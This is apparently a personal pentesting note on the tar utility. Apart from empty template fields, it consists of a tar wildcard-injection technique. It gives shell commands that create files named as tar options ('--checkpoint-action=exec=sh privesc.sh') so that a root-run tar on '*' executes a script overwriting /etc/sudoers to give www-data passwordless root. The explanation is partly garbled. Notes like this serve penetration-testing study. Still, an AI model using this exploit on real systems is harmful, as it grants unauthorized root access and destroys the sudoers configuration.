---
creation date: July 18th 2023
last modified date: July 18th 2023
aliases: []
tags: #🧰
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🧰  

# [[tar]]  
___

## Description:
Used for file compression

## Installation


## Commands


## Exploits
### Wildcard
- If we locate a tar command that ends with a `*` we can use `--checkpoints` inn order to inject our own code
- This example is able to add `NO PASSWD` for all sudo commands on our current user if the file ends up getting run by *root*
```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
```
- The where would need to replaced where ever the tar command is pointing towards we use the filenames to act as ticks here to add more length to the tar command.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 18th 2023 (09:50 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
